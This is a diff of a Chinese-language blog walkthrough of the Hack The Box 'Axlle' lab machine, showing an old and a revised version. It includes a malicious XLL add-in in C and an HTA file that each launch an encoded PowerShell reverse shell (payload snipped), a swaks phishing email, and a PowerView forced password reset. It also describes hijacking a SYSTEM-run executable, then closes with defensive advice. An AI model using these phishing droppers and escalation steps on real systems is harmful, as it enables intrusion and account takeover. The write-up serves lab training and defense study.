+<h4 id="DNS-服务-53-TCP"><a href="#DNS-服务-53-TCP" class="headerlink" title="DNS 服务 (53&#x2F;TCP)"></a>DNS 服务 (53&#x2F;TCP)</h4><ul>
+<li>运行 <code>Simple DNS Plus</code></li>
+<li>域名：<code>axlle.htb0</code></li>
+</ul>
+<h4 id="Web-服务-80-TCP"><a href="#Web-服务-80-TCP" class="headerlink" title="Web 服务 (80&#x2F;TCP)"></a>Web 服务 (80&#x2F;TCP)</h4><ul>
+<li>Microsoft IIS 10.0</li>
+<li>需进行详细的 Web 应用测试</li>
+</ul>
+<h4 id="域控服务"><a href="#域控服务" class="headerlink" title="域控服务"></a>域控服务</h4><ul>
+<li>Kerberos (88&#x2F;TCP)</li>
+<li>LDAP (389&#x2F;TCP): Active Directory LDAP</li>
+<li>NetBIOS (139&#x2F;TCP)</li>
+<li>SMB (445&#x2F;TCP)<ul>
+<li>消息签名已启用且必需</li>
+<li>Windows Server SMB 服务</li>
+</ul>
+</li>
+</ul>
+<h4 id="RPC-服务-135-TCP"><a href="#RPC-服务-135-TCP" class="headerlink" title="RPC 服务 (135&#x2F;TCP)"></a>RPC 服务 (135&#x2F;TCP)</h4><ul>
+<li>Microsoft Windows RPC</li>
+</ul>
 <hr>
-<h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="1-SMTP-服务-25-tcp"><a href="#1-SMTP-服务-25-tcp" class="headerlink" title="1. SMTP 服务 (25/tcp)"></a><strong>1. SMTP 服务 (<code>25/tcp</code>)</strong></h3><ul>
+<h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="攻击面分析"><a href="#攻击面分析" class="headerlink" title="攻击面分析"></a>攻击面分析</h3><ol>
+<li><p><strong>邮件系统</strong></p>
+<ul>
+<li>hMailServer 可能存在配置问题</li>
+<li>可尝试邮件钓鱼攻击</li>
+</ul>
+</li>
+<li><p><strong>域环境</strong></p>
+<ul>
+<li>完整的 AD 域环境</li>
+<li>可能存在域用户枚举机会</li>
+<li>Kerberos 认证可能存在配置问题</li>
+</ul>
+</li>
+<li><p><strong>Web 应用</strong></p>
+<ul>
+<li>IIS 10.0 可能存在漏洞</li>
+<li>需进行详细的 Web 应用测试</li>
+</ul>
+</li>
+</ol>
+<h3 id="1-SMTP-服务-25-tcp"><a href="#1-SMTP-服务-25-tcp" class="headerlink" title="1. SMTP 服务 (25/tcp)"></a><strong>1. SMTP 服务 (<code>25/tcp</code>)</strong></h3><ul>
 <li><strong>软件信息</strong>: <code>hMailServer smtpd</code><ul>
 <li>确定了具体的 SMTP 服务软件和版本，可能存在已知漏洞。</li>
 </ul>
@@ -335,99 +353,172 @@
 </li>
 </ul>
 <hr>
-<h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><p>如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至<a href="mailto:&#97;&#99;&#99;&#x6f;&#x75;&#110;&#x74;&#115;&#x40;&#97;&#x78;&#x6c;&#x6c;&#x65;&#x2e;&#104;&#x74;&#98;">&#97;&#99;&#99;&#x6f;&#x75;&#110;&#x74;&#115;&#x40;&#97;&#x78;&#x6c;&#x6c;&#x65;&#x2e;&#104;&#x74;&#98;</a>。请注意，由于我们的安全状况，所有宏都被禁用。 </p>
+<h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><p>如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至<a href="mailto:&#97;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x73;&#64;&#x61;&#120;&#108;&#x6c;&#x65;&#46;&#x68;&#116;&#x62;">&#97;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x73;&#64;&#x61;&#120;&#108;&#x6c;&#x65;&#46;&#x68;&#116;&#x62;</a>。请注意，由于我们的安全状况，所有宏都被禁用。 </p>
 <p>XLL （Excel Add-In） 执行攻击是一种网络攻击，它利用 XLL 文件在 Microsoft Excel 中执行恶意代码。XLL 文件是专为与 Excel 一起使用而设计的动态链接库 （DLL），允许开发人员使用自定义函数和特性扩展 Excel 的功能。</p>
-<p>poc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) void __cdecl xlAutoOpen(void);</span><br><span class="line"> </span><br><span class="line">void __cdecl xlAutoOpen() &#123;</span><br><span class="line">    WinExec(&quot;powershell -e &lt;snipped&gt;pAA==&quot;, 1);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">) &#123;</span><br><span class="line">    switch (ul_reason_for_call) &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="1-XLL-文件攻击"><a href="#1-XLL-文件攻击" class="headerlink" title="1. XLL 文件攻击"></a>1. XLL 文件攻击</h3><p>由于目标禁用了宏，我们可以使用 XLL (Excel Add-In) 进行攻击。XLL 是专为 Excel 设计的动态链接库，可以扩展 Excel 功能。</p>
+<ol>
+<li>创建恶意 XLL 文件：</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) <span class="type">void</span> __cdecl <span class="title function_">xlAutoOpen</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">xlAutoOpen</span><span class="params">()</span> &#123;</span><br><span class="line">    WinExec(<span class="string">&quot;powershell -e &lt;snipped&gt;pAA==&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">    DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">    LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exp.c -luser32 </span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li><p>编译 XLL 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exp.c -luser32 </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发送钓鱼邮件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">swaks --to accounts@axlle.htb \</span><br><span class="line">      --from root@test.htb \</span><br><span class="line">      --body <span class="string">&quot;Shell&quot;</span> \</span><br><span class="line">      --header <span class="string">&quot;Subject: Help me Breach the System&quot;</span> \</span><br><span class="line">      --attach @shell.xll</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="2-获取初始访问"><a href="#2-获取初始访问" class="headerlink" title="2. 获取初始访问"></a>2. 获取初始访问</h3><p>成功获取反弹 shell 后，我们使用 PowerShell 获取更稳定的会话：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-e</span> &lt;base64_encoded_reverse_shell&gt;</span><br></pre></td></tr></table></figure>
 
-
-<p>发送右键 等待鱼上钩</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to accounts@axlle.htb --from root@test.htb --body &quot;Shell&quot; --header &quot;Subject: Help me Breach the System&quot; --attach @shell.xll</span><br></pre></td></tr></table></figure>
-
-
-<p><a href="/assets/img/Pasted%20image%2020241122160927.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122160927.png"></a><br><a href="/assets/img/Pasted%20image%2020241122161132.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122161132.png"></a></p>
-<p>为了获取更为稳固的shell<br><a href="/assets/img/Pasted%20image%2020241122163421.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122163421.png"></a><br><a href="/assets/img/Pasted%20image%2020241122165746.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122165746.png"></a></p>
-<h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><p>首先自动枚举<br><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe</a></p>
-<p>这只是为我们提供了机器的基本概述。我们需要继续进行一些手动枚举。由于机器上有一个邮件服务器，并且 gideon 管理电子邮件系统，我们总是可以查找最新的电子邮件，看看是否有有趣的信息：</p>
-<p><a href="/assets/img/Pasted%20image%2020241122170433.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122170433.png"></a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一封发给用户 dallon.matrix 的电子邮件，由 webdevs@axlle.htb 发送。它告诉我们，我们可以将 Web 快捷方式拖放到 C：\inetpub\testing 文件夹中，然后用户 webdevs 将自动运行它。</span><br></pre></td></tr></table></figure>
-
-<h3 id="HTA"><a href="#HTA" class="headerlink" title="HTA"></a>HTA<a target="_blank" rel="noopener" href="https://jadu101.github.io/A-Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Axlle#hta"></a></h3><p>让我们在里面创建恶意制作的 .hta 文件，并等待自动化运行它。<code>C:\inetpub\testing</code></p>
+<h2 id="🔍-内网信息收集"><a href="#🔍-内网信息收集" class="headerlink" title="🔍 内网信息收集"></a>🔍 内网信息收集</h2><h3 id="1-自动化枚举"><a href="#1-自动化枚举" class="headerlink" title="1. 自动化枚举"></a>1. 自动化枚举</h3><p>使用 WinPEAS 进行初步信息收集：<br><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe</a></p>
+<h3 id="2-邮件系统枚举"><a href="#2-邮件系统枚举" class="headerlink" title="2. 邮件系统枚举"></a>2. 邮件系统枚举</h3><p>由于机器上运行着邮件服务器，且用户 gideon 管理邮件系统，我们检查最新邮件：</p>
+<p>发现重要信息：</p>
 <blockquote>
-<p>HTA（HTML 应用程序）攻击是一种网络攻击，它利用 HTA 文件的功能在受害者的系统上执行恶意代码。HTA 文件是由 Microsoft HTML 应用程序主机 （） 执行的 HTML 文件。它们具有文件扩展名，并且可以包含 HTML、VBScript、JavaScript 和其他 Web 技术的组合。打开后，HTA 文件将作为独立应用程序运行，并具有与用户相同的权限。<code>mshta.exe``.hta</code></p>
+<p>发件人：<a href="mailto:&#119;&#101;&#x62;&#100;&#101;&#x76;&#x73;&#x40;&#x61;&#120;&#x6c;&#x6c;&#x65;&#46;&#x68;&#x74;&#x62;">&#119;&#101;&#x62;&#100;&#101;&#x76;&#x73;&#x40;&#x61;&#120;&#x6c;&#x6c;&#x65;&#46;&#x68;&#x74;&#x62;</a><br>收件人：dallon.matrix<br>内容：可以将 Web 快捷方式拖放到 <code>C:\inetpub\testing</code> 文件夹中，webdevs 用户将自动运行它</p>
 </blockquote>
-<p>我们将创建<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example">包含</a>以下内容的 shell.hta 文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver -smb2support share .</span><br></pre></td></tr></table></figure>
-
-
+<h3 id="3-HTA-文件攻击"><a href="#3-HTA-文件攻击" class="headerlink" title="3. HTA 文件攻击"></a>3. HTA 文件攻击</h3><p>我们可以使用 HTA 文件攻击来获取 shell。HTA 文件是 HTML 应用程序，可以包含恶意代码。</p>
+<ol>
+<li>创建恶意 HTA 文件：</li>
+</ol>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">&quot;shell&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> c = <span class="string">&quot;powershell -e &lt;snipped&gt;pAA==&quot;</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;WScript.Shell&#x27;</span>).<span class="title class_">Run</span>(c, <span class="number">0</span>, <span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>self.close();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><a href="/assets/img/Pasted%20image%2020241122171329.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122171329.png"></a></p>
-<p>反弹shell 成功<br><a href="/assets/img/Pasted%20image%2020241122171438.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122171438.png"></a></p>
-<h2 id="🔨-提权"><a href="#🔨-提权" class="headerlink" title="🔨 提权"></a>🔨 提权</h2><ul>
-<li><p><strong>描述</strong>：在目标系统中进行权限提升，获取 root 权限。</p>
+<ol start="2">
+<li><p>发送 HTA 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver -smb2support share .</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>步骤</strong>：</p>
+<li><p>等待自动化运行 HTA 文件：</p>
 </li>
-<li><p>  由于这是一台 Active Directory 计算机，我们将上传并运行 bloodhound.exe：：<br><a href="/assets/img/Pasted%20image%2020241122171929.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122171929.png"></a><br>  <a href="/assets/img/Pasted%20image%2020241122172116.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122172116.png"></a></p>
-<p>  利用文件共享进行文件上传</p>
+</ol>
+<p>成功获取反弹 shell 后，我们使用 PowerShell 获取更稳定的会话：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-e</span> &lt;base64_encoded_reverse_shell&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🔨-权限提升"><a href="#🔨-权限提升" class="headerlink" title="🔨 权限提升"></a>🔨 权限提升</h2><h3 id="1-域内信息收集"><a href="#1-域内信息收集" class="headerlink" title="1. 域内信息收集"></a>1. 域内信息收集</h3><p>使用 BloodHound 进行域内信息收集：</p>
+<ol>
+<li><p>上传 BloodHound：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share $(<span class="built_in">pwd</span>) -smb2support</span><br></pre></td></tr></table></figure>
 </li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share $(pwd) -smb2support</span><br></pre></td></tr></table></figure>
-<hr>
-<p><a href="/assets/img/Pasted%20image%2020241122172544.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122172544.png"></a></p>
-<p><a href="/assets/img/Pasted%20image%2020241122173441.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122173441.png"></a></p>
-<p><a href="/assets/img/Pasted%20image%2020241122173452.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122173452.png"></a></p>
-<h3 id="ForceChangePassword-（强制更改密码）"><a href="#ForceChangePassword-（强制更改密码）" class="headerlink" title="ForceChangePassword （强制更改密码）"></a>ForceChangePassword （强制更改密码）<a target="_blank" rel="noopener" href="https://jadu101.github.io/A-Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Axlle#forcechangepassword"></a></h3><blockquote>
-<p>组 WEB <a href="mailto:DEVS@AXLLE.HTB">的成员DEVS@AXLLE。HTB</a> 具有更改用户 <a href="mailto:JACOB.GREENY@AXLLE.HTB">JACOB 的能力。GREENY@AXLLE。HTB</a> 的密码，而不知道该用户的当前密码。</p>
-</blockquote>
-<p>让我们先传输 powerview.ps1：</p>
-<p><code>copy \\10.10.16.27\share\PowerView.ps1</code></p>
-<p>现在我们将用户 jacob 的密码更改为我们想要的任何密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainUserPassword -Identity &#x27;JACOB.GREENY&#x27; -AccountPassword (ConvertTo-SecureString -AsPlainText &#x27;NewPassword123!&#x27; -Force)</span><br></pre></td></tr></table></figure>
-<p><a href="/assets/img/Pasted%20image%2020241122175636.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122175636.png"></a><br>我们可以使用更改后的密码以 jacob 的身份 winrm：</p>
-<p><a href="/assets/img/Pasted%20image%2020241122174558.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122174558.png"></a><br><a href="/assets/img/Pasted%20image%2020241122175654.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122175654.png"></a></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在 App Development 文件夹中，有一个 README.md 文件：<br><a href="/assets/img/Pasted%20image%2020241122180500.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122180500.png"></a></p>
-<p>README.md 文件显示standalonerunner.exe文件正在作为自动化的 SYSTEM 运行：</p>
-<p><a href="/assets/img/Pasted%20image%2020241122180512.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122180512.png"></a></p>
-<p>在 里面，我们可以找到 standalonerunner.exe：<code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64</code><br>我们来检查一下权限：<br><code>icacls standalonerunner.exe</code></p>
+<li><p>在目标机器上执行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bloodhound.exe <span class="literal">-c</span> all</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="2-权限提升路径分析"><a href="#2-权限提升路径分析" class="headerlink" title="2. 权限提升路径分析"></a>2. 权限提升路径分析</h3><p>通过 BloodHound 分析发现：</p>
 <ul>
-<li><strong>完全控制：、</strong>、 。<code>AXLLE\Administrator``NT AUTHORITY\SYSTEM``BUILTIN\Administrators</code></li>
-<li><strong>读取和执行，写入</strong>：.<code>AXLLE\App Devs</code></li>
-<li><strong>读取并执行</strong>：，，。<code>BUILTIN\Users``APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES``APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES</code></li>
-<li><strong>只读：</strong>。<code>Everyon</code><br><a href="/assets/img/Pasted%20image%2020241122180428.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122180428.png"></a></li>
+<li>组 <code>WEB DEVS@AXLLE.HTB</code> 的成员可以修改用户 <code>JACOB.GREENY@AXLLE.HTB</code> 的密码</li>
+<li>不需要知道该用户的当前密码</li>
 </ul>
-<p>制作恶意的<code>standalonerunner.exe</code> 进行反弹</p>
-<p><a href="/assets/img/Pasted%20image%2020241122182139.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122182139.png"></a></p>
-<p>等待几秒钟后，自动化以系统身份运行反向 shell 有效负载，我们以管理员身份获得一个 shell<br><a href="/assets/img/Pasted%20image%2020241122182036.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122182036.png"></a></p>
-<h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><ul>
-<li><strong>信息搜集技巧</strong>：<ul>
-<li>端口扫描与服务枚举技巧。</li>
-<li>Web 漏洞检测技巧。</li>
+<h3 id="3-利用-PowerView-修改密码"><a href="#3-利用-PowerView-修改密码" class="headerlink" title="3. 利用 PowerView 修改密码"></a>3. 利用 PowerView 修改密码</h3><ol>
+<li><p>上传 PowerView：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> \\<span class="number">10.10</span>.<span class="number">16.27</span>\share\PowerView.ps1 .</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改用户密码：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> <span class="string">&#x27;JACOB.GREENY&#x27;</span> <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlainText</span> <span class="string">&#x27;NewPassword123!&#x27;</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用新密码通过 WinRM 连接：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">11.21</span> <span class="literal">-u</span> JACOB.GREENY <span class="literal">-p</span> <span class="string">&#x27;NewPassword123!&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="4-系统权限提升"><a href="#4-系统权限提升" class="headerlink" title="4. 系统权限提升"></a>4. 系统权限提升</h3><ol>
+<li><p>发现自动化程序：<br>在 <code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64</code> 目录下发现 <code>standalonerunner.exe</code></p>
+</li>
+<li><p>检查文件权限：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls standalonerunner.exe</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>权限分配：</p>
+<ul>
+<li>完全控制：<ul>
+<li><code>AXLLE\Administrator</code></li>
+<li><code>NT AUTHORITY\SYSTEM</code></li>
+<li><code>BUILTIN\Administrators</code></li>
 </ul>
 </li>
-<li><strong>漏洞利用技巧</strong>：<ul>
-<li>如何使用 Metasploit 或自行编写漏洞利用脚本。</li>
-<li>获取反向 shell 与持续访问。</li>
+<li>读取和执行，写入：<ul>
+<li><code>AXLLE\App Devs</code></li>
 </ul>
 </li>
-<li><strong>Post-Exploitation 技巧</strong>：<ul>
-<li>获取目标的敏感信息和访问权限。</li>
-<li>提升权限，进行横向移动。</li>
+<li>读取并执行：<ul>
+<li><code>BUILTIN\Users</code></li>
+<li><code>APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES</code></li>
+<li><code>APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES</code></li>
+</ul>
+</li>
+<li>只读：<ul>
+<li><code>Everyone</code></li>
 </ul>
 </li>
 </ul>
-<hr>
-<h2 id="🧳-攻击链与流程图"><a href="#🧳-攻击链与流程图" class="headerlink" title="🧳 攻击链与流程图"></a>🧳 攻击链与流程图</h2><ul>
-<li>可视化渗透测试的整体攻击过程，确保每一步都清晰。</li>
+<ol start="3">
+<li><p>替换恶意程序：<br>创建反弹 shell 的可执行文件并替换原文件</p>
+</li>
+<li><p>等待自动化运行，获取 SYSTEM 权限</p>
+</li>
+</ol>
+<h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><h3 id="1-信息收集技巧"><a href="#1-信息收集技巧" class="headerlink" title="1. 信息收集技巧"></a>1. 信息收集技巧</h3><ul>
+<li><strong>端口扫描</strong><ul>
+<li>使用 <code>naabu</code> 快速扫描</li>
+<li>使用 <code>nmap</code> 进行详细版本探测</li>
 </ul>
-<hr>
-<h2 id="📅-总结"><a href="#📅-总结" class="headerlink" title="📅 总结"></a>📅 总结</h2><ul>
-<li><strong>成功步骤</strong>：简要描述成功的渗透测试步骤和关键点。</li>
-<li><strong>遇到的困难与挑战</strong>：列出在过程中遇到的难点及解决方案。</li>
-<li><strong>后续建议</strong>：对靶场的进一步探索或防御建议。</li>
+</li>
+<li><strong>服务枚举</strong><ul>
+<li>SMTP 服务配置分析</li>
+<li>Active Directory 域环境识别</li>
+<li>Web 服务版本识别</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-攻击技术"><a href="#2-攻击技术" class="headerlink" title="2. 攻击技术"></a>2. 攻击技术</h3><ul>
+<li><strong>邮件钓鱼</strong><ul>
+<li>XLL 文件攻击绕过宏限制</li>
+<li>HTA 文件执行技巧</li>
+</ul>
+</li>
+<li><strong>域内渗透</strong><ul>
+<li>BloodHound 域内信息收集</li>
+<li>PowerView 密码修改</li>
+<li>自动化任务劫持</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-权限提升技巧"><a href="#3-权限提升技巧" class="headerlink" title="3. 权限提升技巧"></a>3. 权限提升技巧</h3><ul>
+<li><strong>横向移动</strong><ul>
+<li>利用域用户权限</li>
+<li>WinRM 远程连接</li>
+</ul>
+</li>
+<li><strong>纵向提升</strong><ul>
+<li>文件权限分析</li>
+<li>系统服务替换</li>
+<li>自动化任务利用</li>
+</ul>
+</li>
+</ul>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><h3 id="攻击链回顾"><a href="#攻击链回顾" class="headerlink" title="攻击链回顾"></a>攻击链回顾</h3><ol>
+<li>通过邮件系统投递 XLL 文件获取初始访问</li>
+<li>利用 HTA 文件获取更稳定的 shell</li>
+<li>使用 BloodHound 发现域内提权路径</li>
+<li>通过 PowerView 修改域用户密码</li>
+<li>利用自动化任务获取系统权限</li>
+</ol>
+<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ol>
+<li><strong>邮件安全</strong><ul>
+<li>严格限制附件类型</li>
+<li>实施邮件安全网关</li>
+</ul>
+</li>
+<li><strong>域环境加固</strong><ul>
+<li>严格控制域用户权限</li>
+<li>定期审计域内权限</li>
+</ul>
+</li>
+<li><strong>系统加固</strong><ul>
+<li>限制自动化任务权限</li>
+<li>加强文件系统权限控制</li>
